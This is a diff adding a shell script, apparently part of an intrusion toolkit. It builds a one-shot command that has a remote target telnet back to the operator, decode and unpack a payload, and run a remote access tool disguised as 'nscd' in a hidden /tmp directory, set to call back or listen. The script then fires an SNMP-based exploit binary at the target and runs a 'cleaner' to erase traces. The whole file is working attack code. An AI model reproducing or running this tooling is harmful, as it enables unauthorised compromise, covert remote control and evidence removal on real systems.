@@ -1,0 +1,220 @@
+#!/bin/sh
+VERSION=1.0.2.2
+##########################################################
+### Generate & run the following script:
+### 	- script to upload nosy on target (oneshot.scr)
+### 	- run grins/frowns/whatever using the above script
+##########################################################
+COLOR_SUCCESS="\\033[1;32m"
+COLOR_FAILURE="\\033[1;31m"
+COLOR_WARNING="\\033[1;33m"
+COLOR_NORMAL="\\033[0;39m"
+COLOR_NOTE="\\033[0;34m"
+SETCOLOR_SUCCESS="echo -en $COLOR_SUCCESS"
+SETCOLOR_FAILURE="echo -en $COLOR_FAILURE"
+SETCOLOR_WARNING="echo -en $COLOR_WARNING"
+SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
+SETCOLOR_NOTE="echo -en $COLOR_NOTE"
+$SETCOLOR_NOTE
+echo "CommandLine: ${0} ${*}"
+$SETCOLOR_NORMAL
+echo ""
+
+# Some default values
+SCRIPT="/tmp/.t"
+DIR="/tmp/.X11R6"
+GS_OPTION=frowns
+RUN_FILE=nscd
+#CALLBACKPORT=
+
+LOCAL_IP_GUESS=`ifconfig -a | egrep "encap|inet" | egrep -vi "grep|127\.0\.0\.1|loopback"`
+
+# Show usage and exit
+usage() {
+    echo ""
+#    echo "Before running this script, you first need to run the following:"
+#    echo "      nc -l -p localPort < file2Xfer&Run.Z.uu"
+#    echo "      (nc must be in your path; it's also run w/in this script)"
+#    echo "where file2Xfer&Run.Z.uu is a compressed, uuencoded file."
+    echo "Using -c option requires local nosy or nopen client command as follows:"
+    echo "	noxxxx -l <callbackPort>"
+    echo "You'll be prompted when to start it."
+    echo ""
+    echo "Your local IP(s) appears to be:"
+    echo "$LOCAL_IP_GUESS"
+    echo ""
+    echo "Usage: ${0} [options]"
+    echo "  -i <remoteIP>                (required)"
+    echo "  -g <grins|frowns|sneer>      def= $GS_OPTION"
+    echo "  -l <localIP>                 (required)"
+    echo "  -n <localPort>               (required)"
+    echo "  -c <callbackPort>            (no default)"
+    echo "  -p <listenPort>              (no default)"
+    echo "  -D <remoteDir>               def= $DIR"
+    echo "  -f <remoteRATName>           def= $RUN_FILE"
+    echo "  -E <RATenvironment vars>     (no default)"
+    echo "  -A <RATarguments>            (no default)"
+    echo "  -S <remoteScript>            DEPRECATED (and ignored)"
+    echo "  -s <remoteScript>            DEPRECATED (and ignored)"
+    echo ""
+    echo "gs.os.gs v. $VERSION"
+    exit 1
+}
+
+#prompt for callback RAT listen
+callback() {
+	echo "You also need to start your RAT client in listen mode at this point."
+	CLIENTS=`ls -1 ../bin/nosy*cl* ../bin/nocl* 2>/dev/null | wc -l`
+	if [ $CLIENTS -ge 2 ]; then
+	    echo "Choose your poison:"
+	fi
+	echo ""
+	for i in `ls ../bin/nosy*cl* ../bin/nocl*`; do
+	  echo "	$i -l $CALLBACKPORT"
+	done
+
+	echo ""
+}
+# There must be at least three arguments
+if [ ${#} -le 2 ]; then
+    usage
+fi
+
+#
+# Process args
+#
+    RATENVS=""
+    RATARGS=""
+    while getopts g:i:n:f:c:p:l:D:S:s:A:E: op; do
+	case $op in
+	g)  GS_OPTION="$OPTARG";;
+	i)  REMOTE_IP="$OPTARG";;
+	l)  LOCAL_IP="$OPTARG";;
+	n)  LOCAL_PORT="$OPTARG";;
+	c)  CALLBACKPORT="$OPTARG";;
+	p)  LISTENPORT="$OPTARG";;
+	f)  RUN_FILE="$OPTARG";;
+	D)  DIR="$OPTARG";;
+	S)  SCRIPT="$OPTARG";; # these are ignored
+	s)  SCRIPT="$OPTARG";;
+	E)  RATENVS="$OPTARG";;
+	A)  RATARGS="$OPTARG";;
+	esac
+    done
+    cmdFlag="-c"
+    shift `expr $OPTIND - 1`
+
+    # Check for required args
+    [ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+    [ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
+    [ -z "$LOCAL_PORT" ] && echo "Error: missing local PORT" && usage
+
+
+#following line is now unused
+EXTRA="${*}"
+
+echo "Generating oneshot upload script." 
+
+if [ ! -z "$CALLBACKPORT" ] && [ ! -z "$LISTENPORT" ]; then
+    echo "Only specify either a callback or listen port."
+    exit 1
+fi
+
+[ -z "$CALLBACKPORT" ] || if [ $CALLBACKPORT -le 65000 -a ${CALLBACKPORT} -ge 1 ]; then
+
+	echo "RAT will call back on port $CALLBACKPORT."
+	#CALLBACK="CIP=$LOCAL_IP CPORT=$CALLBACKPORT "
+	RAT_DARG="D=-uc$LOCAL_IP:$CALLBACKPORT "
+else
+	RAT_DARG=""
+fi
+
+[ -z "$LISTENPORT" ] || if [ $LISTENPORT -le 65000 -a $LISTENPORT -ge 1 ]; then
+    echo "RAT will listen on port $LISTENPORT."
+    RAT_DARG="D=-ul$LISTENPORT "
+else
+    RAT_DARG=""
+fi
+
+cat > oneshot.scr << EOF
+/sbin/sh -c (mkdir	$DIR;	cd	$DIR &&	telnet $LOCAL_IP $LOCAL_PORT </dev/console 2>/dev/null |uudecode > /dev/null 2>&1 && uncompress -f $RUN_FILE.Z && chmod 777 $RUN_FILE && PATH=. $RATENVS $RAT_DARG$RUN_FILE $RATARGS;)&
+EOF
+
+echo "oneshot script is as follows: "
+echo "========"
+cat oneshot.scr
+echo "========"
+echo ""
+
+OOPS=`grep $RUN_FILE ../up/$RUN_FILE.Z.uu`
+if [ ! "$OOPS" ]; then
+  echo "FATAL ERROR: ../up/$RUN_FILE.Z.uu appears to contain file other than $RUN_FILE."
+  echo "\`grep $RUN_FILE ../up/$RUN_FILE.Z.uu\`=\"$OOPS\""
+  echo ""
+  exit 1
+fi 
+OOPS=`wc -c oneshot.scr  |awk '{print $1}'`
+if [ ! -f "oneshot.scr" -o -z ${OOPS} -o ${OOPS} -ge 254 -o ${OOPS} -le 0 ]; then
+  echo "FATAL ERROR: oneshot.scr is either not there or too large"
+  exit 1
+fi 
+
+echo "You now need to run \"packrat\" or \"nc\" in a local window as follows:"
+echo -e "$COLOR_NOTE\n
+      packrat $RUN_FILE $LOCAL_PORT
+$COLOR_NORMAL
+		-- OR --
+$COLOR_NOTE
+      cd ../up; ls -al $RUN_FILE.Z.uu 
+      nc -l -p $LOCAL_PORT    < ./$RUN_FILE.Z.uu 
+         (...and watch tcpdump)$COLOR_NORMAL
+"
+
+[ ! -z "$CALLBACKPORT" ] && if [ ${CALLBACKPORT} -le 65000 -a ${CALLBACKPORT} -ge 1 ]; then
+    callback
+fi
+echo -e "About to run:  $COLOR_NOTE\n\n"
+echo -e "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public \n\n"
+
+echo -en "${COLOR_WARNING}(Hit return when you've got a rat listener started)$COLOR_NORMAL"
+read input
+
+
+echo "now running:  "
+echo "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public "
+./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public
+
+if [ "$GS_OPTION" = "frowns" ] ; then
+  $SETCOLOR_NOTE
+  echo -e "\nOK, ./frowns has finished.\n"
+  echo -e "\ngs.os.gr is going to run cleaner for you now, unless you (A)bort...\n\n"
+  $SETCOLOR_WARNING
+  echo -e "./cleaner $REMOTE_IP public snmpx\n\n"
+  $SETCOLOR_NOTE
+  echo -en "Press return to run cleaner as shown, or enter \"A\" to abort."
+  $SETCOLOR_NORMAL
+  read ans
+  ABORT=`echo $ans | tr "a-z" "A-Z"`
+  if [ "${ABORT:0:1}" = "A" ] ; then
+    $SETCOLOR_FAILURE
+    echo -e "\n\n\aWHAT!!  Ok, then. You need to clean up after your own mess.\n\n"
+    $SETCOLOR_NORMAL
+  else
+    ./cleaner $REMOTE_IP public snmpx
+  fi
+fi
+
+SOCKETS=`ps -eaf | grep -w socket | grep -v grep`
+if [ "$SOCKETS" ] ; then
+  echo -e "\n\nYou still have socket running locally:\n\n$SOCKETS\n\n"
+fi
+
+echo -e "$COLOR_NOTE\n\nThank you for playing$COLOR_NORMAL\n\n"
+
+### echo "removing intermediate scripts"
+### rm ./gr_upload.scr ./oneshot.scr ./gr_upload.uu 
+
+echo
+echo "Don't forget to look for stray telnets running on target."
+echo "If there are you are totally hosed because you didn't use ftp."
+echo -e "\n\nDone.\n\n"
